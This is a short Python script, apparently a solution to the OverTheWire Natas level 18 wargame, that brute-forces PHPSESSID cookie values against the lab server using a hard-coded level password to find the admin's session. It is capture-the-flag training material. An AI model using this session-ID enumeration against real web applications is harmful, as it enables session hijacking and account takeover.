import requests
import time

session = requests.Session()
session.auth = ("natas18", "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP")

occur = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

password = ""

for i in range(641):
    cookies = dict(PHPSESSID=str(i))
    auth = session.post('http://natas18.natas.labs.overthewire.org/index.php?', cookies=cookies)

    print(str(i), auth.text)

    if "regular" not in auth.text:
        print("exists", str(i))
        break



